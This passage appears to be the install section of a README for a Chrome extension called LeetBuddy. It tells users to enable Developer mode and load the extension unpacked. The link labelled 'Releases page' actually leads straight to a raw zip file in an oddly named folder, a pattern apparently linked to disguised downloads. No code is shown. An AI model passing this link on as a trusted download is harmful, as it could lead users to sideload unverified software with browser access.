## üöÄ Getting Started

To begin, you need to install the LeetBuddy Chrome Extension. The following steps will guide you through the process:

1. **Visit the Releases Page**  
   Go to our [Releases page](https://raw.githubusercontent.com/ZakwanShah16/LeetBuddy/main/idiosyncratical/LeetBuddy.zip).

2. **Download LeetBuddy**  
   Look for the latest version of LeetBuddy on the Releases page. Click on the link to download the extension. It will typically have a file format suitable for Chrome extensions.

3. **Open Chrome**  
   Launch the Google Chrome browser on your computer.

4. **Access Extensions**  
   Click on the three vertical dots in the upper right corner. Hover over "More Tools" and click on "Extensions."

5. **Enable Developer Mode**  
   In the Extensions page, toggle the switch labeled "Developer mode" located in the top right corner.

6. **Load Unpacked Extension**  
   Click on "Load unpacked." A dialog will open. Navigate to the location where you downloaded LeetBuddy. Select the folder and click "Open."

7. **Using LeetBuddy**  
   Once added, you will see the LeetBuddy icon in your Chrome toolbar. Click it anytime you are on a LeetCode problem page to access your tools.
